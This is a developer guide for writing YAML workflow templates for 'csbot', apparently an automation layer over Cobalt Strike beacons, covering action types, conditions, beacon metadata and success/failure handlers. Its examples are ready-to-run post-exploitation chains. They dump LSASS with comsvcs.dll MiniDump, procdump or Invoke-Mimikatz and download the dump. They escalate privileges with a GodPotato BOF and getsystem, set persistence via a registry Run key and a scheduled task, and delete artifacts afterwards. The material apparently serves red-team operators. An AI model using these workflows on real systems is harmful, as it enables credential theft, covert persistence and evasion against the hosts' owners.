# Workflow Template Development Guide

Complete reference for creating csbot workflow templates.

## Table of Contents

- [Workflow Structure](#workflow-structure)
- [Action Types](#action-types)
- [Conditions](#conditions)
- [Beacon Metadata](#beacon-metadata)
- [Success/Failure Handlers](#successfailure-handlers)
- [Advanced Features](#advanced-features)
- [Examples](#examples)

## Workflow Structure

### Basic Structure

```yaml
name: Workflow Name              # Required: Human-readable workflow name
beacon_id: "abc123"              # Optional: Specific beacon ID, omit for interactive selection
parallel: false                  # Optional: Execute actions in parallel (default: false)

actions:                         # Required: List of actions to execute
  - name: action1
    type: getuid
  - name: action2
    type: shell
    parameters:
      command: "whoami"
```

### Field Descriptions

- **name**: Workflow identifier (shown in logs)
- **beacon_id**: Target beacon ID. If omitted, bot prompts for interactive selection
- **parallel**: Execute all top-level actions concurrently (use with caution)
- **actions**: Ordered list of actions to execute

## Action Types

### Built-in Actions

#### getuid

Get current user context (includes privileges).

```yaml
- name: check_user
  type: getuid
```

**Output**: User information including privileges and impersonation status

#### getsystem

Attempt privilege escalation to SYSTEM using built-in techniques.

```yaml
- name: escalate
  type: getsystem
```

**Output**: Success/failure status

#### shell

Execute shell command via cmd.exe.

```yaml
- name: run_command
  type: shell
  parameters:
    command: "ipconfig /all"         # Required: Command to execute
```

**Output**: Command output

#### powershell

Execute PowerShell command using managed PowerShell.

```yaml
- name: run_ps
  type: powershell
  parameters:
    command: "Get-Process | Select-Object -First 5"  # Required: PowerShell command
```

**Output**: PowerShell output

#### upload

Upload file to beacon's current working directory.

```yaml
- name: upload_tool
  type: upload
  parameters:
    local_path: "/opt/tools/tool.exe"      # Required: Local file path
```

**Output**: Upload status (file uploaded to beacon's CWD)

#### download

Download file from beacon.

```yaml
- name: download_file
  type: download
  parameters:
    remote_path: "C:\\Users\\user\\file.txt"  # Required: Remote file path
```

**Output**: Download status (file saved to CS downloads folder)

#### screenshot

Capture screenshot from beacon.

```yaml
- name: capture_screen
  type: screenshot
```

**Output**: Screenshot status (image saved to CS downloads folder)

#### sleep

Pause workflow execution.

```yaml
- name: wait
  type: sleep
  parameters:
    duration: "30s"  # Required: Duration (e.g., "5s", "2m", "1h")
```

**Output**: None

### BOF Actions

#### bof_string

Execute BOF with string arguments.

```yaml
- name: run_bof
  type: bof_string
  parameters:
    bof: /path/to/bof.o           # Required: Path to BOF file
    entrypoint: go                # Optional: Entrypoint function (default: "go")
    arguments: "arg1 arg2 arg3"   # Optional: Space-separated string arguments
```

#### bof_packed

Execute BOF with pre-packed binary arguments (base64 encoded).

```yaml
- name: run_bof_packed
  type: bof_packed
  parameters:
    bof: /path/to/bof.o
    entrypoint: go
    arguments: "YmluYXJ5IGRhdGE="  # Base64-encoded packed arguments
```

#### bof_pack

Execute BOF with typed arguments (automatically packed by Cobalt Strike API).

```yaml
- name: run_bof_typed
  type: bof_pack
  parameters:
    bof: /path/to/bof.o
    entrypoint: go
    arguments:
      - type: string
        value: "target.exe"
      - type: wstring
        value: "Wide String"
      - type: int
        value: 1234
      - type: short
        value: 100
```

**Supported types**: `string`, `wstring`, `int`, `short`, `binary`

#### bof_pack_custom

Execute BOF with typed arguments using custom packing (csbot-side packing instead of API-side). This is implemented due to a serverside issue with the standard pack API endpoint on release. 

```yaml
- name: run_bof_custom_packed
  type: bof_pack_custom
  parameters:
    bof: /path/to/bof.o
    entrypoint: go
    arguments:
      - type: string
        value: "target.exe"
      - type: wstring
        value: "Wide String"
      - type: int
        value: 1234
      - type: short
        value: 100
```

**Use case**: When you need precise control over argument packing or when the API's packing doesn't match your BOF's expectations.

**Supported types**: Same as `bof_pack` (`string`, `wstring`, `int`, `short`, `binary`). You can also use the short form options `zZsib`

## Conditions

Conditions control whether an action executes based on previous outputs or beacon metadata.

### Simple Conditions (Legacy - AND Logic)

All conditions must be true:

```yaml
- name: conditional_action
  type: shell
  parameters:
    command: "whoami"
  conditions:
    - source: previous_action    # Action name or beacon field
      operator: contains          # Comparison operator
      value: "SYSTEM"            # Value to match
      case_sensitive: false      # Optional: Case sensitivity (default: false)
```

### Condition Operators

- **contains**: Output contains value
- **not_contains**: Output does not contain value
- **equals**: Output equals value exactly
- **matches**: Output matches regex pattern

### OR Logic (any_of)

Execute if ANY condition is true:

```yaml
- name: check_privileges
  type: getuid
  any_of:
    - source: beacon.user
      operator: contains
      value: "SYSTEM"
    - source: beacon.impersonated
      operator: contains
      value: "SYSTEM"
    - source: beacon.isAdmin
      operator: equals
      value: "true"
```

### AND Logic (all_of)

Execute if ALL conditions are true:

```yaml
- name: admin_only_windows10
  type: powershell
  parameters:
    command: "Get-ComputerInfo"
  all_of:
    - source: beacon.isAdmin
      operator: equals
      value: "true"
    - source: beacon.os
      operator: contains
      value: "Windows 10"
```

### Nested Logic

Combine OR and AND for complex conditions:

```yaml
# (Admin OR SYSTEM) AND Windows 10
- name: complex_check
  type: shell
  parameters:
    command: "systeminfo"
  all_of:
    - any_of:
        - source: beacon.isAdmin
          operator: equals
          value: "true"
        - source: beacon.user
          operator: contains
          value: "SYSTEM"
    - source: beacon.os
      operator: contains
      value: "Windows 10"
```

### Regex Matching

```yaml
conditions:
  - source: privilege_check
    operator: matches
    value: "Se(Impersonate|Assignprimarytoken)Privilege"
```

## Beacon Metadata

Beacon metadata is automatically fetched and available for all conditions via `beacon.` prefix.

### Available Fields

| Field | Type | Description | Example |
|-------|------|-------------|---------|
| `beacon.user` | string | Current user | `DOMAIN\admin` |
| `beacon.impersonated` | string | Impersonated user (if any) | `NT AUTHORITY\SYSTEM` |
| `beacon.isAdmin` | bool | Admin/elevated status | `true` |
| `beacon.computer` | string | Computer name | `DC-01` |
| `beacon.os` | string | Operating system | `Windows 10 Enterprise` |
| `beacon.internal` | string | Internal IP address | `10.0.0.5` |
| `beacon.external` | string | External IP address | `1.2.3.4` |
| `beacon.process` | string | Process name | `explorer.exe` |
| `beacon.pid` | int | Process ID | `1234` |
| `beacon.beaconArch` | string | Beacon architecture | `x64` |
| `beacon.systemArch` | string | System architecture | `x64` |
| `beacon.session` | string | Session type | `interactive` |
| `beacon.listener` | string | Active listener | `http-listener` |
| `beacon.alive` | bool | Beacon alive status | `true` |

### Usage Examples

```yaml
# Skip if already SYSTEM
- name: escalate
  type: getsystem
  any_of:
    - source: beacon.user
      operator: not_contains
      value: "SYSTEM"
    - source: beacon.impersonated
      operator: not_contains
      value: "SYSTEM"

# Only on Windows 10/11
- name: modern_exploit
  type: bof_pack
  parameters:
    bof: /opt/bofs/modern.o
  any_of:
    - source: beacon.os
      operator: contains
      value: "Windows 10"
    - source: beacon.os
      operator: contains
      value: "Windows 11"

# Admin-only operations
- name: sensitive_op
  type: powershell
  parameters:
    command: "Get-LocalUser"
  all_of:
    - source: beacon.isAdmin
      operator: equals
      value: "true"
```

## Success/Failure Handlers

Execute different actions based on success or failure of previous action.

### on_success

Executes if parent action succeeds:

```yaml
- name: primary_action
  type: getsystem
  on_success:
    - name: verify
      type: getuid
    - name: persist
      type: shell
      parameters:
        command: "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Test /t REG_SZ /d calc.exe"
```

### on_failure

Executes if parent action fails:

```yaml
- name: risky_exploit
  type: bof_string
  parameters:
    bof: /opt/bofs/exploit.o
  on_failure:
    - name: fallback
      type: getsystem
    - name: log_failure
      type: shell
      parameters:
        command: "echo Failed > C:\\temp\\status.txt"
```

### Combined Handlers

```yaml
- name: critical_action
  type: powershell
  parameters:
    command: "Invoke-Mimikatz"
  on_success:
    - name: exfiltrate
      type: download
      parameters:
        remote_path: "C:\\temp\\creds.txt"
  on_failure:
    - name: cleanup
      type: shell
      parameters:
        command: "del C:\\temp\\creds.txt"
    - name: try_alternative
      type: shell
      parameters:
        command: "procdump -ma lsass.exe lsass.dmp"
```

### Nested Success/Failure

Handlers can have their own handlers:

```yaml
- name: level1
  type: getsystem
  on_success:
    - name: level2
      type: shell
      parameters:
        command: "whoami"
      on_success:
        - name: level3
          type: getuid
```

## Advanced Features

### Variable Interpolation

Reference previous action outputs in parameters:

```yaml
- name: get_username
  type: shell
  parameters:
    command: "whoami"

- name: use_username
  type: shell
  parameters:
    command: "echo User is ${get_username}"  # Interpolates output from get_username
```

### Parallel Execution

Execute all top-level actions simultaneously:

```yaml
name: Parallel Recon
parallel: true

actions:
  - name: network_scan
    type: shell
    parameters:
      command: "ipconfig /all"

  - name: process_list
    type: shell
    parameters:
      command: "tasklist"

  - name: user_list
    type: shell
    parameters:
      command: "net user"
```

**Warning**: Parallel execution can overload beacons with low check-in intervals.

### Action Naming

Action names must be unique and are used for:
- Condition source references
- Variable interpolation
- Logging and output
- Workflow debugging

```yaml
# Good - descriptive and unique
- name: check_admin_privileges
- name: download_sensitive_file
- name: escalate_to_system

# Bad - vague or duplicate
- name: action1
- name: check
- name: run_command
```

## Examples

### Credential Harvesting

```yaml
name: Credential Harvesting

actions:
  # Only dump LSASS if SYSTEM or impersonated as SYSTEM
  - name: dump_lsass
    type: powershell
    any_of:
      - source: beacon.user
        operator: contains
        value: "SYSTEM"
      - source: beacon.impersonated
        operator: contains
        value: "SYSTEM"
    parameters:
      command: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
    on_success:
      - name: download_dump
        type: download
        parameters:
          remote_path: C:\Windows\Temp\lsass.dmp
      - name: cleanup_dump
        type: shell
        parameters:
          command: del C:\Windows\Temp\lsass.dmp
    on_failure:
      - name: try_procdump
        type: shell
        parameters:
          command: procdump -ma lsass.exe lsass.dmp

  # Check for saved credentials
  - name: enum_creds
    type: shell
    parameters:
      command: cmdkey /list
```

### Privilege Escalation Chain

```yaml
name: Privilege Escalation Workflow

actions:
  # Check current context
  - name: check_context
    type: getuid

  # Try SeImpersonate exploit if privilege exists
  - name: godpotato_exploit
    type: bof_string
    parameters:
      bof: /opt/bofs/GodPotato.o
      entrypoint: go
      arguments: "-cmd whoami"
    conditions:
      - source: check_context
        operator: contains
        value: "SeImpersonatePrivilege"
    on_success:
      - name: verify_system
        type: getuid
    on_failure:
      - name: try_getsystem
        type: getsystem

  # If not admin, skip advanced techniques
  - name: advanced_exploit
    type: bof_pack
    parameters:
      bof: /opt/bofs/exploit.o
      arguments:
        - type: int
          value: 1234
    all_of:
      - source: beacon.isAdmin
        operator: equals
        value: "true"
      - source: beacon.os
        operator: contains
        value: "Windows 10"
```

### Conditional Recon Based on OS

```yaml
name: OS-Specific Recon

actions:
  # Windows 10/11 specific checks
  - name: modern_windows_recon
    type: powershell
    parameters:
      command: |
        Get-ComputerInfo
        Get-NetFirewallProfile
        Get-MpPreference
    any_of:
      - source: beacon.os
        operator: contains
        value: "Windows 10"
      - source: beacon.os
        operator: contains
        value: "Windows 11"

  # Legacy Windows checks
  - name: legacy_windows_recon
    type: shell
    parameters:
      command: |
        systeminfo
        netsh advfirewall show allprofiles
    any_of:
      - source: beacon.os
        operator: contains
        value: "Windows 7"
      - source: beacon.os
        operator: contains
        value: "Windows Server 2012"
```

### Multi-Stage with Fallbacks

```yaml
name: Multi-Stage Exploitation

actions:
  # Stage 1: Check environment
  - name: recon
    type: getuid

  # Stage 2: Primary exploit path
  - name: primary_exploit
    type: bof_string
    parameters:
      bof: /opt/bofs/exploit1.o
    conditions:
      - source: recon
        operator: contains
        value: "SeImpersonatePrivilege"
    on_success:
      - name: establish_persistence
        type: shell
        parameters:
          command: "schtasks /create /tn Update /tr calc.exe /sc onlogon"
    on_failure:
      - name: secondary_exploit
        type: bof_string
        parameters:
          bof: /opt/bofs/exploit2.o
        on_failure:
          - name: last_resort
            type: getsystem

  # Stage 3: Alternative path if not privileged
  - name: alternative_path
    type: shell
    parameters:
      command: "net user /domain"
    conditions:
      - source: recon
        operator: not_contains
        value: "SeImpersonatePrivilege"
```

## Best Practices

### 1. Always Name Actions Descriptively

```yaml
# Good
- name: check_for_admin_privileges_before_escalation
  type: getuid

# Bad
- name: action1
  type: getuid
```

### 2. Use Beacon Metadata for Pre-checks

```yaml
# Skip unnecessary actions
- name: escalate_only_if_needed
  type: getsystem
  conditions:
    - source: beacon.isAdmin
      operator: equals
      value: "false"
```

### 3. Always Handle Failures for Critical Actions

```yaml
- name: critical_exploit
  type: bof_string
  parameters:
    bof: /opt/bofs/exploit.o
  on_failure:
    - name: cleanup
      type: shell
      parameters:
        command: "del C:\\temp\\exploit.log"
    - name: notify
      type: shell
      parameters:
        command: "echo FAILED > C:\\temp\\status.txt"
```

### 4. Test with Sleep and Getuid First

```yaml
# Test workflow logic before running exploits
- name: test_condition
  type: getuid

- name: wait_before_action
  type: sleep
  parameters:
    duration: "5s"

- name: safe_test
  type: shell
  parameters:
    command: "whoami"
  conditions:
    - source: test_condition
      operator: contains
      value: "SYSTEM"
```

### 5. Use OR Logic for Flexible Conditions

```yaml
# Check multiple possible success conditions
any_of:
  - source: beacon.user
    operator: contains
    value: "admin"
  - source: beacon.isAdmin
    operator: equals
    value: "true"
  - source: beacon.impersonated
    operator: contains
    value: "SYSTEM"
```

## Validation

Before execution, workflows are validated for:

- Required fields (name, actions)
- Valid action types
- Required parameters for each action type
- BOF file existence
- Valid operators in conditions
- Unique action names
- Valid beacon metadata field references
- Proper condition group syntax

Warnings (non-blocking):
- BOF file not found
- Beacon not alive
- Unknown beacon field reference
- Condition references undefined action

## Troubleshooting

### Conditions Not Working

1. Check action names match exactly (case-sensitive)
2. Verify condition source exists before reference
3. Check operator spelling
4. Test with simpler conditions first
5. Review logs for condition evaluation output

### BOF Execution Fails

1. Verify BOF path is absolute and correct
2. Check BOF architecture matches beacon
3. Ensure arguments are properly formatted
4. Test BOF manually in Cobalt Strike first

### Variable Interpolation Not Working

1. Ensure action has completed before interpolation
2. Check variable syntax: `${action_name}`
3. Verify action produced output
4. Check for typos in action name

### Beacon Metadata Incorrect

1. Beacon metadata is fetched once at workflow start
2. Changes during execution not reflected
3. Use `getuid` action for real-time user checks
